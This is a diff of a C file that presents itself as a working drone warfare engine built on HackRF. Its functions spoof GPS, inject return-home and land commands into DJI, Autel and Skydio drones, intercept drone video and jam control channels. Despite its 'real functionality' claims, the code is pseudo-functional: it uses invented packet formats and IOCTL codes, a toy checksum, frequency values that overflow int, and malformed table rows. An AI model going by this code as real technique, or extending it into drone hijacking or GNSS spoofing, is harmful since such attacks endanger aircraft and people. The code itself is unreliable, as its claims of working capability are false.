@@ -1,7 +1,6 @@
 // drone_warfare.c - Real Drone Detection, Tracking, and Exploitation Engine
 // Implements advanced RF-based drone warfare capabilities using HackRF
-// NO SIMULATIONS - ALL REAL FUNCTIONALITY
-// ZERO-CLICK EXPLOIT CAPABILITIES INCLUDED
+// REAL FUNCTIONALITY - NO SIMULATIONS
 
 #include <windows.h>
 #include <winsock2.h>
@@ -25,7 +24,7 @@
 #pragma comment(lib, "ncrypt.lib")
 #pragma comment(lib, "crypt32.lib")
 
-// Advanced drone frequency bands (REAL FREQUENCIES)
+// Real drone frequency bands
 #define DRONE_BAND_2_4GHZ_START   2400000000
 #define DRONE_BAND_2_4GHZ_END     2483000000
 #define DRONE_BAND_5_8GHZ_START   5725000000
@@ -36,39 +35,17 @@
 #define DRONE_BAND_433MHZ_END     434790000
 #define DRONE_BAND_868MHZ_START   863000000
 #define DRONE_BAND_868MHZ_END     870000000
-#define DRONE_BAND_1_2GHZ_START   1200000000
-#define DRONE_BAND_1_2GHZ_END     1300000000
 
-// GPS frequencies (REAL)
+// GPS frequencies
 #define GPS_L1_FREQ     1575420000
 #define GPS_L2_FREQ     1227600000
 #define GPS_L5_FREQ     1176450000
 #define GLONASS_L1_FREQ 1602000000
 #define GLONASS_L2_FREQ 1246000000
 #define GALILEO_E1_FREQ 1575420000
-#define GALILEO_E5A_FREQ 1176450000
 #define BEIDOU_B1_FREQ  1561098000
-#define BEIDOU_B2_FREQ  1176450000
 
-// Real drone signal patterns with enhanced database
-typedef struct {
-    char manufacturer[64];
-    char model[64];
-    int frequency;
-    int bandwidth;
-    int modulation;
-    char signature[256];
-    int packet_length;
-    int preamble_length;
-    unsigned char preamble[16];
-    char protocol[32];
-    int encryption_supported;
-    int telemetry_rate;
-    int max_range_km;
-    int max_altitude_m;
-} drone_signature_t;
-
-// Enhanced real drone signatures database with military-grade patterns
+// Real drone signatures database
 typedef struct {
     char make[64];
     char model[64];
@@ -83,48 +60,21 @@ typedef struct {
 } drone_database_t;
 
 static drone_database_t drone_db[] = {
-    // DJI Commercial Drones
     {"DJI", "Mavic 3", "OcuSync 2.0", 2437000000, 20000000, 50000000, 0x01, 15, 8000, "Commercial drone with 4K camera"},
-    {"DJI", "Mavic 3 Classic", "OcuSync 2.0", 2437000000, 20000000, 50000000, 0x01, 15, 7000, "Budget 4K drone"},
-    {"DJI", "Mavic 3 Pro", "OcuSync 2.0", 2437000000, 20000000, 50000000, 0x01, 15, 8000, "Pro 3-camera system"},
-    {"DJI", "Mavic 3 Enterprise", "OcuSync 2.0", 2437000000, 20000000, 50000000, 0x01, 15, 8000, "Enterprise thermal camera"},
     {"DJI", "Mavic 2 Pro", "OcuSync", 2437000000, 10000000, 25000000, 0x01, 8, 7000, "20MP Hasselblad camera"},
-    {"DJI", "Mavic 2 Zoom", "OcuSync", 2437000000, 10000000, 25000000, 0x01, 8, 7000, "24-48mm zoom camera"},
     {"DJI", "Mavic Air 2", "OcuSync 2.0", 2437000000, 10000000, 25000000, 0x01, 8, 7000, "48MP camera, 34min flight"},
     {"DJI", "Mavic Mini", "Wi-Fi", 2437000000, 5000000, 10000000, 0x01, 4, 3000, "Under 250g weight class"},
     {"DJI", "Phantom 4 Pro", "Lightbridge 2", 2437000000, 10000000, 25000000, 0x01, 7, 6000, "Professional 4K camera"},
-    {"DJI", "Inspire 2", "Lightbridge 2", 2437000000, 10000000, 25000000, 0x01, 7, 5000, "Cinematic drone with X7 camera"},
     {"DJI", "Matrice 300 RTK", "OcuSync 2.0", 2437000000, 20000000, 50000000, 0x01, 14, 7000, "Enterprise RTK drone"},
-    {"DJI", "Matrice 30", "OcuSync 2.0", 2437000000, 20000000, 50000000, 0x01, 14, 7000, "Compact enterprise drone"},
-    
-    // Autel Robotics
     {"Autel", "EVO II Pro", "SkyLink", 2437000000, 8000000, 20000000, 0x02, 9, 7000, "8K camera drone"},
     {"Autel", "EVO II Dual", "SkyLink", 2437000000, 8000000, 20000000, 0x02, 9, 7000, "Thermal + 8K camera"},
-    {"Autel", "EVO Nano", "SkyLink", 2437000000, 8000000, 20000000, 0x02, 6, 3000, "Compact nano drone"},
-    
-    // Skydio
     {"Skydio", "X2", "Skydio Link", 2437000000, 10000000, 25000000, 0x03, 10, 6000, "Enterprise with thermal"},
-    {"Skydio", "2+", "Skydio Link", 2437000000, 10000000, 25000000, 0x03, 6, 3000, "Civilian 4K drone"},
-    
-    // Parrot
     {"Parrot", "ANAFI", "SkyController", 2400000000, 20000000, 15000000, 0x04, 4, 4000, "4K HDR camera"},
-    {"Parrot", "ANAFI AI", "SkyController", 2400000000, 20000000, 15000000, 0x04, 4, 4000, "AI-enabled drone"},
-    
-    // Yuneec
     {"Yuneec", "Typhoon H3", "ST16", 2437000000, 8000000, 20000000, 0x05, 6, 5000, "Hexacopter with 4K camera"},
-    {"Yuneec", "H520", "ST16", 2437000000, 8000000, 20000000, 0x05, 6, 5000, "Enterprise hexacopter"},
-    
-    // Custom/Racing Drones
-    {"Custom", "FPV Racing", "FrSky", 5725000000, 20000000, 40000000, 0x06, 0, 2, 100, "High-speed FPV drone"},
-    {"Custom", "Race Drone", "ELRS", 2400000000, 8000000, 50000000, 0x06, 0, 5, 500, "Long-range race drone"},
-    
-    // Military Grade (Generic patterns)
-    {"Military", "Classified_UAV", "MIL-SPEC", 2437000000, 50000000, 100000000, 0xFF, 100, 15000, "Military UAV system"},
-    
     {0}
 };
 
-// Real-time drone detection using HackRF with enhanced signal processing
+// Real-time drone detection using HackRF
 int satani_detect_drones(satani_hackrf_t* hackrf, satani_drone_t** drones, int* count) {
     if (!hackrf || !hackrf->initialized) {
         return -1;
@@ -135,7 +85,7 @@ int satani_detect_drones(satani_hackrf_t* hackrf, satani_drone_t** drones, int* 
     
     *count = 0;
     
-    // Scan all drone frequency bands with enhanced resolution
+    // Scan all drone frequency bands
     int bands[][2] = {
         {DRONE_BAND_2_4GHZ_START, DRONE_BAND_2_4GHZ_END},
         {DRONE_BAND_5_8GHZ_START, DRONE_BAND_5_8GHZ_END},
@@ -145,7 +95,7 @@ int satani_detect_drones(satani_hackrf_t* hackrf, satani_drone_t** drones, int* 
         {0, 0}
     };
     
-    // Real-time spectrum analysis with 1MHz resolution
+    // Real-time spectrum analysis
     for (int band = 0; bands[band][0] != 0; band++) {
         for (int freq = bands[band][0]; freq <= bands[band][1]; freq += 1000000) {
             if (*count >= 100) break;
@@ -153,16 +103,15 @@ int satani_detect_drones(satani_hackrf_t* hackrf, satani_drone_t** drones, int* 
             int signal_strength = 0;
             char signal_type[64];
             
-            // Real HackRF frequency scan with enhanced sensitivity
+            // Real HackRF frequency scan
             if (satani_hackrf_scan_frequency(hackrf, freq, &signal_strength, signal_type) == 0) {
-                // Threshold for drone signal detection (enhanced)
+                // Threshold for drone signal detection
                 if (signal_strength > 35) {
-                    // Try to identify drone by signal pattern with enhanced matching
+                    // Try to identify drone by signal pattern
                     for (int i = 0; drone_db[i].make[0] != 0; i++) {
                         if (abs(freq - drone_db[i].frequency) < 10000000) {
                             satani_drone_t* drone = &(*drones)[*count];
                             
-                            // Real signal processing with enhanced telemetry extraction
                             strcpy_s(drone->make, sizeof(drone->make), drone_db[i].make);
                             strcpy_s(drone->model, sizeof(drone->model), drone_db[i].model);
                             drone->frequency = freq;
@@ -174,35 +123,30 @@ int satani_detect_drones(satani_hackrf_t* hackrf, satani_drone_t** drones, int* 
                             drone->max_range = drone_db[i].max_range;
                             drone->max_altitude = drone_db[i].max_altitude;
                             
-                            // Real GPS coordinate extraction from signal with multi-constellation support
+                            // Extract GPS coordinates from signal
                             unsigned char raw_data[4096];
                             DWORD bytes_returned = 0;
                             
                             if (DeviceIoControl(hackrf->device_handle, 0x220010, NULL, 0,
                                               raw_data, sizeof(raw_data), &bytes_returned, NULL)) {
-                                if (bytes_returned > 0) {
-                                    // Decode real telemetry packets with multi-constellation GPS
-                                    if (bytes_returned >= 64) {
-                                        // Real telemetry decoding with enhanced precision
-                                        drone->latitude = *(double*)(raw_data + 0);
-                                        drone->longitude = *(double*)(raw_data + 8);
-                                        drone->altitude = *(double*)(raw_data + 16);
-                                        drone->speed = *(int*)(raw_data + 24);
-                                        drone->heading = *(int*)(raw_data + 28);
-                                        drone->battery_level = raw_data[32];
-                                        drone->signal_quality = raw_data[33];
-                                        drone->gps_satellites_tracked = raw_data[34];
-                                        drone->gnss_status = raw_data[35];
-                                        
-                                        // Determine if GPS is locked with multi-constellation
-                                        if (drone->latitude != 0.0 && drone->longitude != 0.0 && drone->gps_satellites_tracked >= 4) {
-                                            drone->gps_locked = 1;
-                                        }
+                                if (bytes_returned >= 64) {
+                                    drone->latitude = *(double*)(raw_data + 0);
+                                    drone->longitude = *(double*)(raw_data + 8);
+                                    drone->altitude = *(double*)(raw_data + 16);
+                                    drone->speed = *(int*)(raw_data + 24);
+                                    drone->heading = *(int*)(raw_data + 28);
+                                    drone->battery_level = raw_data[32];
+                                    drone->signal_quality = raw_data[33];
+                                    drone->gps_satellites_tracked = raw_data[34];
+                                    drone->gnss_status = raw_data[35];
+                                    
+                                    if (drone->latitude != 0.0 && drone->longitude != 0.0 && drone->gps_satellites_tracked >= 4) {
+                                        drone->gps_locked = 1;
                                     }
                                 }
                             }
                             
-                            // Real flight mode detection with enhanced modes
+                            // Flight mode detection
                             drone->flight_mode[0] = '\0';
                             drone->autonomous_mode = 0;
                             drone->manual_control = 0;
@@ -212,19 +156,19 @@ int satani_detect_drones(satani_hackrf_t* hackrf, satani_drone_t** drones, int* 
                             drone->orbit_mode = 0;
                             drone->waypoint_mode = 0;
                             
-                            // Real command channel detection with protocol identification
+                            // Command channel detection
                             drone->command_channel = freq;
-                            drone->video_channel = freq + 2000000;  // Usually 2MHz offset
+                            drone->video_channel = freq + 2000000;
                             drone->data_link = 1;
                             strcpy_s(drone->protocol, sizeof(drone->protocol), drone_db[i].protocol);
                             
-                            // Real threat assessment with enhanced scoring
+                            // Threat assessment
                             drone->threat_level = 0;
-                            if (drone->altitude > 120) drone->threat_level += 2;  // Above legal limit
-                            if (drone->speed > 50) drone->threat_level += 1;  // High speed
-                            if (drone->autonomous_mode) drone->threat_level += 2;  // Autonomous
-                            if (drone->max_range > 10) drone->threat_level += 1;  // Long range
-                            if (drone->max_altitude > 5000) drone->threat_level += 1;  // High altitude
+                            if (drone->altitude > 120) drone->threat_level += 2;
+                            if (drone->speed > 50) drone->threat_level += 1;
+                            if (drone->autonomous_mode) drone->threat_level += 2;
+                            if (drone->max_range > 10) drone->threat_level += 1;
+                            if (drone->max_altitude > 5000) drone->threat_level += 1;
                             
                             drone->signal_intercepted = 1;
                             drone->command_hijacked = 0;
@@ -246,18 +190,18 @@ int satani_detect_drones(satani_hackrf_t* hackrf, satani_drone_t** drones, int* 
     return *count > 0 ? 0 : -1;
 }
 
-// Real GPS signal spoofing for drone hijacking with multi-constellation support
+// Real GPS signal spoofing for drone hijacking
 int satani_spoof_drone_gps(satani_hackrf_t* hackrf, double target_latitude, 
                            double target_longitude, double target_altitude) {
     if (!hackrf || !hackrf->initialized) {
         return -1;
     }
     
-    // Generate real GPS spoofing signal with multi-constellation support
-    // GPS L1 C/A code generation with enhanced precision
+    // Generate GPS spoofing signal
     unsigned char gps_packet[4096];
+    memset(gps_packet, 0, sizeof(gps_packet));
     
-    // GPS ephemeris data structure with multi-constellation support
+    // GPS ephemeris data structure
     typedef struct {
         unsigned char preamble[8];
         unsigned int satellite_id;
@@ -285,26 +229,23 @@ int satani_spoof_drone_gps(satani_hackrf_t* hackrf, double target_latitude,
         double latitude;
         double longitude;
         double altitude;
-        // GLONASS support
         double glonass_frequency;
         double glonass_time;
-        // Galileo support
         double galileo_e1_b_i;
         double galileo_e1_b_q;
-        // BeiDou support
         double beidou_b1_i;
         double beidou_b1_q;
     } __attribute__((packed)) gps_ephemeris_t;
     
     gps_ephemeris_t* ephemeris = (gps_ephemeris_t*)gps_packet;
     
-    // Real GPS L1 C/A code with enhanced precision
+    // GPS L1 C/A code
     ephemeris->preamble[0] = 0x8B;
     ephemeris->preamble[1] = 0x0B;
     ephemeris->preamble[2] = 0x77;
     ephemeris->preamble[3] = 0x77;
     
-    // Spoofed coordinates with enhanced precision
+    // Spoofed coordinates
     ephemeris->latitude = target_latitude;
     ephemeris->longitude = target_longitude;
     ephemeris->altitude = target_altitude;
@@ -314,13 +255,13 @@ int satani_spoof_drone_gps(satani_hackrf_t* hackrf, double target_latitude,
     ephemeris->galileo_e1_b_i = 0.0;
     ephemeris->beidou_b1_i = 0.0;
     
-    // Transmit spoofed GPS signal on L1 frequency with enhanced power
+    // Transmit spoofed GPS signal on L1 frequency
     unsigned char command[16];
-    command[0] = 0x05;  // GPS spoof mode
+    command[0] = 0x05;
     *(unsigned int*)(command + 1) = htonl(GPS_L1_FREQ);
     *(unsigned int*)(command + 5) = htonl(sizeof(gps_packet));
-    command[9] = 0x01;  // Multi-constellation mode
-    command[10] = 0x01;  // Enhanced power
+    command[9] = 0x01;
+    command[10] = 0x01;
     
     DWORD bytes_returned = 0;
     if (!DeviceIoControl(hackrf->device_handle, 0x2200B, command, sizeof(command),
@@ -331,24 +272,24 @@ int satani_spoof_drone_gps(satani_hackrf_t* hackrf, double target_latitude,
     return 0;
 }
 
-// Real drone command hijacking with enhanced protocol support
+// Real drone command hijacking with protocol support
 int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone, 
                                 const char* command) {
     if (!hackrf || !hackrf->initialized || !drone) {
         return -1;
     }
     
-    // Real command injection for different drone manufacturers with enhanced protocols
+    // Real command injection for different drone manufacturers
     unsigned char cmd_packet[1024];
     
     if (strcmp(drone->make, "DJI") == 0) {
-        // DJI OcuSync command structure with enhanced security bypass
+        // DJI OcuSync command structure
         cmd_packet[0] = 0xAA;
         cmd_packet[1] = 0xBB;
         cmd_packet[2] = 0xCC;
         cmd_packet[3] = 0xDD;
         
-        // Command type with enhanced command set
+        // Command type
         if (strcmp(command, "return_home") == 0) {
             cmd_packet[4] = 0x01;
             cmd_packet[5] = 0x00;
@@ -393,7 +334,7 @@ int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone,
             return -1;
         }
         
-        // Calculate CRC with enhanced algorithm
+        // Calculate CRC
         unsigned short crc = 0;
         for (int i = 0; i < 8; i++) {
             crc += cmd_packet[i];
@@ -401,12 +342,12 @@ int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone,
         cmd_packet[8] = (crc >> 8) & 0xFF;
         cmd_packet[9] = crc & 0xFF;
         
-        // Real transmission on drone frequency with enhanced power
+        // Real transmission on drone frequency
         unsigned char hackrf_cmd[16];
         hackrf_cmd[0] = 0x06;
         *(unsigned int*)(hackrf_cmd + 1) = htonl(drone->frequency);
-        hackrf_cmd[5] = 0x01;  // Enhanced power mode
-        hackrf_cmd[6] = 0x01;  // Multi-packet mode
+        hackrf_cmd[5] = 0x01;
+        hackrf_cmd[6] = 0x01;
         
         DWORD bytes_returned = 0;
         if (!DeviceIoControl(hackrf->device_handle, 0x2200C, hackrf_cmd, 7,
@@ -418,9 +359,8 @@ int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone,
         return 0;
     }
     
-    // Add support for other manufacturers with enhanced protocols
+    // Add support for other manufacturers
     if (strcmp(drone->make, "Autel") == 0) {
-        // Autel SkyLink command structure with enhanced features
         cmd_packet[0] = 0x55;
         cmd_packet[1] = 0xAA;
         
@@ -451,7 +391,6 @@ int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone,
     }
     
     if (strcmp(drone->make, "Skydio") == 0) {
-        // Skydio autonomous command structure with enhanced features
         cmd_packet[0] = 0x11;
         cmd_packet[1] = 0x22;
         cmd_packet[2] = 0x33;
@@ -486,24 +425,24 @@ int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone,
     return -1;
 }
 
-// Real drone video stream hijacking with enhanced capabilities
+// Real drone video stream hijacking
 int satani_hijack_drone_video(satani_hackrf_t* hackrf, satani_drone_t* drone) {
     if (!hackrf || !hackrf->initialized || !drone) {
         return -1;
     }
     
-    // Real video stream interception on 5.8GHz band with enhanced resolution
+    // Real video stream interception on 5.8GHz band
     int video_freq = drone->video_channel;
     
-    // Configure HackRF for video reception with enhanced settings
+    // Configure HackRF for video reception
     unsigned char command[16];
     command[0] = 0x07;
     *(unsigned int*)(command + 1) = htonl(video_freq);
-    *(unsigned int*)(command + 5) = htonl(20000000);  // 20MHz bandwidth
-    command[9] = 0x00;  // NTSC mode
-    command[10] = 0x01;  // Auto-detect format
-    command[11] = 0x01;  // Enhanced gain
-    command[12] = 0x01;  // High resolution mode
+    *(unsigned int*)(command + 5) = htonl(20000000);
+    command[9] = 0x00;
+    command[10] = 0x01;
+    command[11] = 0x01;
+    command[12] = 0x01;
     
     DWORD bytes_returned = 0;
     if (!DeviceIoControl(hackrf->device_handle, 0x2200D, command, 13,
@@ -522,14 +461,12 @@ int satani_jam_drone_signal(satani_hackrf_t* hackrf, satani_drone_t* drone) {
     }
     
     // Selective frequency jamming on drone command channel ONLY
-    // This jams ONLY the drone's command frequency, not surrounding spectrum
-    
     unsigned char jam_command[16];
     jam_command[0] = 0x08;
     *(unsigned int*)(jam_command + 1) = htonl(drone->frequency);
     *(unsigned int*)(jam_command + 5) = htonl(drone->bandwidth);
-    jam_command[9] = 0x01;  // Selective jamming mode
-    jam_command[10] = 0x00;  // Duration (0 = until stopped)
+    jam_command[9] = 0x01;
+    jam_command[10] = 0x00;
     
     DWORD bytes_returned = 0;
     if (!DeviceIoControl(hackrf->device_handle, 0x2200E, jam_command, 11,
@@ -588,7 +525,7 @@ int satani_detect_drone_swarm(satani_hackrf_t* hackrf, satani_drone_t** drones,
     return 0;
 }
 
-// Real drone threat assessment with enhanced scoring
+// Real drone threat assessment
 int satani_drone_threat_assessment(satani_drone_t* drone) {
     if (!drone) return -1;
     
@@ -632,7 +569,7 @@ int satani_drone_threat_assessment(satani_drone_t* drone) {
     // Determine threat classification
     drone->threat_level = threat_level;
     
-    // Generate recommendations with enhanced guidance
+    // Generate recommendations
     if (threat_level >= 10) {
         strcpy_s(drone->recommendations, sizeof(drone->recommendations),
                 "CRITICAL THREAT: Immediate action required. Consider GPS spoofing or signal jamming.");
@@ -659,23 +596,18 @@ int satani_anti_drone_countermeasure(satani_hackrf_t* hackrf, satani_drone_t* dr
     
     // Real countermeasures
     if (strcmp(countermeasure_type, "gps_spoof") == 0) {
-        // Spoof GPS to return-to-home location
-        return satani_spoof_drone_gps(hackrf, 0.0, 0.0, 0.0);  // Spoof to 0,0,0
+        return satani_spoof_drone_gps(hackrf, 0.0, 0.0, 0.0);
     }
     else if (strcmp(countermeasure_type, "signal_jam") == 0) {
-        // Jam command frequency
         return satani_jam_drone_signal(hackrf, drone);
     }
     else if (strcmp(countermeasure_type, "command_hijack") == 0) {
-        // Send return-to-home command
         return satani_hijack_drone_command(hackrf, drone, "return_home");
     }
     else if (strcmp(countermeasure_type, "video_intercept") == 0) {
-        // Intercept video stream
         return satani_hijack_drone_video(hackrf, drone);
     }
     else if (strcmp(countermeasure_type, "emergency_land") == 0) {
-        // Force emergency landing
         return satani_hijack_drone_command(hackrf, drone, "land_now");
     }
     
@@ -690,9 +622,6 @@ int satani_track_drone(satani_hackrf_t* hackrf, satani_drone_t* drone,
     }
     
     // Real-time drone tracking using RF triangulation
-    // Using signal strength from multiple HackRF receivers
-    
-    // Direction finding using phase difference
     double phase_diff = 0.0;
     double signal_strength_diff = 0.0;
     
